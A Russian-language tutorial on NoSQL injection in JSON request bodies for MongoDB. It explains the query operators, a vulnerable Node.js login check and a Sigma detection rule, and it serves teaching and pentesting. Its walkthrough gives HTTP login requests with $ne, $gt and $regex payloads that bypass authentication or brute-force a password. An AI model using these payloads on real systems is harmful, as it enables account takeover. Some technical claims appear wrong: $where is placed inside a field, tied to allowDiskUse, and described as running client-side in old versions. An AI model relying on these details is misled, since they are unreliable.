# NoSQL Injection в JSON-параметрах запроса: Механизмы эксплуатации, детекция и защита

## Контекст и базовые понятия

NoSQL (Not Only SQL) базы данных возникли как ответ на ограничения реляционных систем (RDBMS) в условиях обработки неструктурированных или полуструктурированных данных, горизонтального масштабирования и высокой скорости разработки. В отличие от RDBMS, где схема данных фиксирована, а язык запросов стандартизирован (SQL), NoSQL системы предлагают различные модели данных: документные (MongoDB, Couchbase), ключ-значение (Redis, DynamoDB), графовые (Neo4j) и колоночные (Cassandra, HBase). Уязвимость NoSQL Injection специфична для документных баз данных, наиболее распространенной из которых является MongoDB, использующая формат BSON (бинарный JSON) для хранения и передачи данных.

Ключевое различие между SQL и NoSQL Injection заключается в механизме формирования запроса. В SQL-инъекциях злоумышленник манипулирует текстовой строкой запроса, используя синтаксические особенности SQL (например, `OR 1=1`), чтобы изменить логику выполнения на уровне парсера SQL. В NoSQL Injection атака направлена на манипуляцию объектами данных, которые парсятся приложением или драйвером базы данных. Поскольку многие драйверы (особенно в Node.js, Python, Java) автоматически десериализуют входящие JSON-объекты в внутренние структуры данных (хеш-таблицы, ассоциативные массивы), уязвимость возникает, когда приложение передает невалидированные пользовательские данные напрямую в методы поиска (например, `db.collection.find()` в MongoDB), позволяя злоумышленнику внедрить специальные операторы базы данных вместо обычных значений.

Путаница в терминологии часто возникает между «NoSQL Injection» и «JSON Injection». JSON Injection — это более широкий термин, обозначающий любое нарушение структуры JSON, которое может привести к ошибкам парсинга или логическим сбоям. NoSQL Injection является частным случаем JSON Injection, где внедренные данные интерпретируются не просто как текст, а как команды или операторы запроса конкретной СУБД. Важно различать также «Object Injection» (внедрение объектов в коде, например, в PHP или JavaScript) и «NoSQL Injection» (внедрение в запросы к БД). В контексте веб-приложений NoSQL Injection чаще всего реализуется через HTTP-запросы, где тело запроса (Body) или параметры URL содержат JSON-объект, который приложение передает в метод аутентификации или поиска.

Сравнительная таблица ниже фиксирует ключевые разграничения между SQL и NoSQL Injection, а также между различными векторами атак на базы данных.

| Характеристика | SQL Injection (RDBMS) | NoSQL Injection (Document DB) | JSON Injection (General) |
| :--- | :--- | :--- | :--- |
| **Целевая СУБД** | MySQL, PostgreSQL, Oracle, MSSQL | MongoDB, CouchDB, DynamoDB | Любая, использующая JSON |
| **Механизм внедрения** | Изменение синтаксиса SQL-запроса | Внедрение операторов БД в поля данных | Нарушение структуры JSON или логики парсинга |
| **Типичный вектор** | `username=' OR '1'='1` | `{"username": {"$gt": ""}}` | `{"key": "value"}` -> `{"key": {"$ne": null}}` |
| **Зависимость от драйвера** | Низкая (стандартный SQL) | Высокая (зависит от реализации драйвера) | Зависит от языка программирования |
| **Основная опасность** | Чтение/изменение/удаление данных, RCE | Обход аутентификации, чтение данных, DoS | Логические ошибки, инъекция кода (в некоторых языках) |
| **Пример оператора** | `UNION SELECT`, `OR 1=1` | `$gt`, `$ne`, `$where`, `$regex` | Нет специфичных операторов БД |

Важно отметить, что NoSQL Injection не ограничивается только MongoDB. Другие документные базы, такие как CouchDB, используют PouchDB/CouchDB Query Language, который также подвержен аналогичным уязвимостям, если параметры запроса формируются из пользовательского ввода. Однако MongoDB остается наиболее распространенной целью из-за популярности стека MEAN/MERN (MongoDB, Express, Angular/React, Node.js), где JSON является нативным форматом обмена данными.

## Внутреннее устройство предмета

NoSQL Injection в контексте MongoDB и JSON-параметров требует понимания внутреннего устройства драйверов базы данных и формата запросов. Драйвер MongoDB (например, `mongodb` для Node.js или `pymongo` для Python) ожидает на вход объект JavaScript (в случае Node.js) или словарь (в случае Python), который соответствует спецификации MongoDB Wire Protocol. Этот объект содержит поля, определяющие коллекцию, условия фильтрации и другие параметры.

### Структура запроса MongoDB

Запрос к MongoDB в формате JSON (или BSON) состоит из корневых объектов и вложенных условий. Условие фильтрации задается в поле `$query` (или напрямую передается как первый аргумент метода `find`). Ключи в этом объекте соответствуют именам полей в документе базы данных, а значения — условиям поиска.

```json
{
  "username": "admin",
  "password": "secret"
}
```

В этом примере приложение ищет документ, где `username` равен `admin` и `password` равен `secret`. Однако MongoDB поддерживает специальные операторы, которые начинаются с символа `$`. Эти операторы позволяют выполнять сложные операции: сравнение, логические операции, регулярные выражения и выполнение JavaScript-кода.

### Ключевые операторы MongoDB, используемые в атаках

Атака NoSQL Injection эксплуатирует возможность внедрения этих операторов в поля, которые должны содержать простые значения (строки, числа).

1.  **Операторы сравнения:**
    *   `$gt` (greater than): больше чем.
    *   `$lt` (less than): меньше чем.
    *   `$gte` (greater than or equal): больше или равно.
    *   `$lte` (less than or equal): меньше или равно.
    *   `$ne` (not equal): не равно.
    *   `$in` (in): значение должно быть в массиве.
    *   `$nin` (not in): значение не должно быть в массиве.

2.  **Логические операторы:**
    *   `$or`: логическое ИЛИ.
    *   `$and`: логическое И.
    *   `$not`: логическое НЕ.

3.  **Операторы работы с данными:**
    *   `$regex`: регулярное выражение.
    *   `$where`: выполнение JavaScript-кода на стороне сервера (наиболее опасный оператор).
    *   `$expr`: использование агрегатных выражений в запросах.

4.  **Специальные операторы для обхода:**
    *   `$exists`: проверка существования поля.
    *   `$type`: проверка типа поля.

### Механизм возникновения уязвимости

Уязвимость возникает, когда приложение выполняет десериализацию входящего JSON-объекта и передает его напрямую в метод поиска без валидации типов полей. Например, в Node.js:

```javascript
// Уязвимый код
const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
});
```

Если `req.body.username` и `req.body.password` приходят из HTTP-запроса как JSON, и приложение не проверяет их типы, злоумышленник может отправить:

```json
{
  "username": "admin",
  "password": { "$ne": null }
}
```

В этом случае драйвер MongoDB интерпретирует значение поля `password` не как строку, а как объект с оператором `$ne`. Запрос становится: «Найти документ, где `username` равен `admin` И `password` не равно `null`». Поскольку у большинства пользователей поле `password` не равно `null`, условие выполняется, и злоумышленник получает доступ к аккаунту.

### Таблица операторов NoSQL Injection

| Оператор | Описание | Пример внедрения | Эффект |
| :--- | :--- | :--- | :--- |
| `$ne` | Not Equal | `{"password": {"$ne": null}}` | Обход проверки пароля (если пароль не null) |
| `$gt` | Greater Than | `{"age": {"$gt": 0}}` | Обход проверки, если поле существует и > 0 |
| `$where` | JS Execution | `{"$where": "this.username === this.password"}` | Выполнение произвольного JS-кода |
| `$regex` | Regex Match | `{"username": {"$regex": "^admin"}}` | Подбор имени пользователя |
| `$in` | In Array | `{"role": {"$in": ["admin", "user"]}}` | Обход проверки роли |
| `$or` | Logical OR | `{"$or": [{"username": "admin"}, {"role": "admin"}]}` | Обход сложных условий |

### Инварианты и ограничения

Не все драйверы и версии MongoDB одинаково подвержены атаке. Современные версии MongoDB (3.6+) и драйверы имеют встроенные механизмы защиты, такие как строгая типизация или валидация схем (JSON Schema Validation). Однако, если схема не настроена или отключена, уязвимость сохраняется. Также важно различать инъекции в параметры запроса и инъекции в параметры агрегации (`$match`, `$group`), которые используют схожие, но не идентичные операторы.

## Применение и работа с предметом

На практике тестирование на проникновение (pentest) и аудит безопасности требуют систематического подхода к выявлению NoSQL Injection. Атака редко приводит к прямой компрометации системы (RCE) без дополнительных условий, но она часто используется для обхода аутентификации и авторизации, что является критическим инцидентом.

### Типовые операции и процедуры

1.  **Идентификация вектора:**
    *   Анализ HTTP-запросов на наличие JSON-тел.
    *   Поиск эндпоинтов, использующих методы `POST`, `PUT`, `PATCH` с `Content-Type: application/json`.
    *   Проверка параметров URL на наличие JSON-подобных структур (например, в GraphQL или REST API).

2.  **Валидация уязвимости:**
    *   Отправка стандартных значений и анализ ответа (HTTP 200 vs 401/403).
    *   Отправка операторов `$ne`, `$gt` и анализ изменения логики приложения.
    *   Использование инструментов автоматизации, таких как `nosqlmap`, `Burp Suite` с плагинами для NoSQL.

3.  **Эксплуатация:**
    *   **Обход аутентификации:** Использование `$ne` или `$gt` для пропуска проверки пароля.
    *   **Подбор данных:** Использование `$regex` для перебора символов пароля или имени пользователя.
    *   **Извлечение данных:** Использование `$where` для выполнения JavaScript-кода, если включен `allowDiskUse` или нет ограничений на выполнение кода.
    *   **DoS:** Использование `$where` с ресурсоемкими операциями или бесконечными циклами.

### Инструментарий и реализации

*   **Burp Suite:** Используется для перехвата и модификации JSON-запросов. Плагин `JSON Web Tokens` или `JSON Inspector` помогает форматировать данные.
*   **nosqlmap:** Автоматизированный инструмент для эксплуатации NoSQL Injection. Поддерживает MongoDB, CouchDB, DynamoDB.
*   **Postman:** Для ручного тестирования API с различными JSON- payloads.
*   **Custom Scripts:** Скрипты на Python с использованием `requests` и `pymongo` для быстрой проверки.

### Пример правила детекции (Sigma)

Для SOC-аналитиков важно детектировать попытки NoSQL Injection в логах веб-серверов или WAF.

```yaml
title: NoSQL Injection Attempt in JSON Body
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects potential NoSQL injection attempts in JSON parameters
logsource:
  category: web_server
  product: nginx
detection:
  selection:
    json_body:
      - '*$ne*'
      - '*$gt*'
      - '*$where*'
      - '*$regex*'
  condition: selection
falsepositives:
  - Legitimate use of MongoDB operators in application logic
level: high
```

### Типичные ошибки и подводные камни

*   **Ложные срабатывания:** Некоторые легитимные приложения могут использовать операторы `$regex` для поиска. Важно анализировать контекст.
*   **Ограничения драйвера:** Некоторые драйверы могут экранировать специальные символы или отклонять объекты с операторами `$` в ключах.
*   **Версии MongoDB:** В старых версиях MongoDB (2.x) оператор `$where` выполнялся на стороне клиента, что могло привести к RCE. В новых версиях он выполняется на сервере, но с ограничениями безопасности.
*   **Защита через валидацию:** Использование JSON Schema Validation в MongoDB может предотвратить инъекции, если схема строго определяет типы полей.

## Сквозной практический пример: Обход аутентификации через NoSQL Injection

**Исходные условия:**
*   **Среда:** Веб-приложение на Node.js с MongoDB (Express.js + Mongoose).
*   **Инструменты:** Burp Suite Professional, Node.js, MongoDB.
*   **Роль:** Тестировщик на проникновение.
*   **Сценарий:** Обход формы логина путем внедрения оператора `$ne` в поле пароля.

### Шаг 1: Анализ нормального запроса

Перехватываем стандартный запрос логина через Burp Suite.

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "testuser",
  "password": "testpass123"
}
```

Ожидаемый вывод: HTTP 200 OK с токеном сессии, если данные верны.

### Шаг 2: Тестирование на уязвимость с оператором $ne

Модифицируем поле `password`, внедряя оператор `$ne`.

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "admin",
  "password": { "$ne": null }
}
```

Ожидаемый вывод: HTTP 200 OK с токеном сессии администратора. Это указывает на то, что приложение не валидирует тип поля `password` и передает его напрямую в запрос к MongoDB.

### Шаг 3: Подтверждение уязвимости с оператором $gt

Проверяем альтернативный оператор `$gt` для обхода проверки.

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "admin",
  "password": { "$gt": "" }
}
```

Ожидаемый вывод: HTTP 200 OK. Успешный обход подтверждает уязвимость.

### Шаг 4: Эксплуатация с оператором $where (если разрешено)

Если приложение позволяет выполнение кода, можно использовать `$where` для более сложного обхода.

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "admin",
  "password": { "$where": "this.password.length > 0" }
}
```

Ожидаемый вывод: HTTP 200 OK. Этот запрос проверяет, что поле `password` существует и его длина больше 0, что позволяет обойти проверку на пустой пароль.

### Шаг 5: Извлечение данных с помощью $regex

Если обход аутентификации не сработал, можно попробовать подобрать пароль.

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "admin",
  "password": { "$regex": "^a" }
}
```

Ожидаемый вывод: HTTP 200 OK, если пароль администратора начинается с буквы 'a'. Это позволяет начать перебор символов.

**Ожидаемый вывод:**
Пример демонстрирует, как простая инъекция оператора `$ne` в поле пароля позволяет обойти аутентификацию без знания реального пароля. Это критическая уязвимость, позволяющая злоумышленнику получить доступ к учетной записи администратора.

## Аналитический вывод

NoSQL Injection в JSON-параметрах представляет собой серьезную угрозу для современных веб-приложений, использующих документные базы данных, такие как MongoDB. Уязвимость возникает из-за недостаточной валидации пользовательского ввода и передачи его напрямую в методы поиска базы данных. В отличие от SQL Injection, которая манипулирует синтаксисом запроса, NoSQL Injection манипулирует структурой данных, внедряя специальные операторы базы данных.

Ключевые аспекты защиты включают:
1.  **Строгая валидация типов:** Использование JSON Schema Validation для обеспечения того, что поля содержат ожидаемые типы данных (строки, числа).
2.  **Использование безопасных методов поиска:** Избегание передачи пользовательского ввода напрямую в методы `find` или `findOne`. Вместо этого следует использовать параметризованные запросы или валидировать входные данные на наличие специальных символов `$`.
3.  **Минимизация прав доступа:** Ограничение прав доступа к базе данных для веб-приложения, чтобы минимизировать ущерб в случае успешной атаки.
4.  **Обновление драйверов и СУБД:** Использование последних версий драйверов и MongoDB, которые имеют встроенные механизмы защиты от инъекций.

Тестирование на проникновение должно включать проверку всех JSON-эндпоинтов на наличие NoSQL Injection, используя как ручные методы, так и автоматизированные инструменты. SOC-аналитики должны настроить правила детекции для выявления попыток внедрения операторов `$ne`, `$gt`, `$where` и других в логах веб-серверов.
